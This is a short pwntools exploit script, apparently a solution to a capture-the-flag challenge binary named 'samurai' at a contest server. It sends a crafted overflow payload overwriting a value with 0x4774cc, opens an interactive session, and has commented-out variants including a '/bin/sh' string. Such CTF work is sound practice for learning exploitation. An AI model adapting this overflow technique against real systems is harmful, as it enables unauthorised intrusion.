#!/usr/bin/env python3

from pwn import *

exe = ELF("./samurai")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, '''
                b *main+207
                c
            ''')
    else:
        r = remote("pwn.chall.pwnoh.io", 13371)

    return r


def main():
    r = conn()

    # r.send(b'A'*10 + b'\0' + b'B'*1000)

    r.send(b'\0' + b'A'*29 + p32(0x4774cc) + b'C'*13)
    # r.send(b'B'*2 + b'\0' + b'A'*43 + p32(0x4774cc))
    # r.send(b'/bin/sh\0')

    r.interactive()


if __name__ == "__main__":
    main()
